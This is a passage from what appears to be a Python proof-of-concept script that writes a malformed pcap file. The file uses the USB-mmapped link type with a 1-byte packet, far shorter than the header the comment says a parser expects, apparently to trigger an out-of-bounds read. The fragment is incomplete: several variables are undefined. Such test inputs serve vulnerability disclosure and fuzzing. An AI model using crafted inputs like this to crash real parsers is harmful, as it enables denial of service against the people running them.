version_major = 2
version_minor = 4

sigfigs = 0
snaplen = 65535
network = 220  # DLT_USB_LINUX_MMAPPED

global_hdr = struct.pack('<IHHiIII', magic, version_major, version_minor, thiszone, sigfigs, snaplen, network)

# packet header - caplen = 1 byte (much less than 64 bytes needed for pcap_usb_header_mmapped)
ts_sec = 0
ts_usec = 0
incl_len = 1  # only 1 byte of packet data
orig_len = 1

    f.write(poc)
